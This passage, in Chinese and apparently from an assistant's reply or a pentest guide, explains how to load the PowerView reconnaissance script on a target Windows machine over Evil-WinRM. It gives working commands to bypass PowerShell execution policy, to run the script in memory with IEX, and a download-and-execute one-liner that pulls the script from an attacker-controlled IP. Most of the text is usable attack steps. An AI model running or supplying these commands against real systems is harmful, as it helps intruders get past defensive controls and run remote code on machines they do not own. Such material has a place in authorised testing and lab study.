```
Set-ExecutionPolicy -Scope CurrentUser 
-ExecutionPolicy RemoteSigned
```

PowerShell

```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

- **原理：** 这条命令只改变当前 PowerShell 进程的设置，不需要管理员权限（通常情况下用户有权修改自己的 `Process` 范围策略）。
    
- **后续：** 执行完这条命令后，再次运行你的 `Import-Module .\PowerView.ps1` 应该就能成功了。
    

#### 方法二：使用内存加载 (IEX)

如果不希望修改策略，或者方法一失败，可以使用 `IEX` (Invoke-Expression) 将脚本内容读入内存直接执行，而不是作为文件运行。

PowerShell

```
Get-Content .\PowerView.ps1 | Out-String | IEX
```

或者，如果该文件在你的攻击机上（而不是目标机上），你可以通过 Evil-WinRM 的 `-s` 参数加载，或者直接远程下载执行：

PowerShell

```
IEX (New-Object Net.WebClient).DownloadString('http://你的攻击机IP/PowerView.ps1')
```

- **原理：** 这种方式不涉及“运行一个 .ps1 文件”的操作，而是执行一串代码字符串，因此通常可以绕过执行策略的文件检查。
    

#### 方法三：Evil-WinRM 的内置功能

Evil-WinRM 本身就是为了方便渗透设计的，它通常自带脚本加载功能。

- 如果你在启动 Evil-WinRM 时使用了 `-s /path/to/local/scripts/` 参数，你可以直接在 Evil-WinRM 提示符下键入脚本名来加载，工具会自动处理很多绕过细节。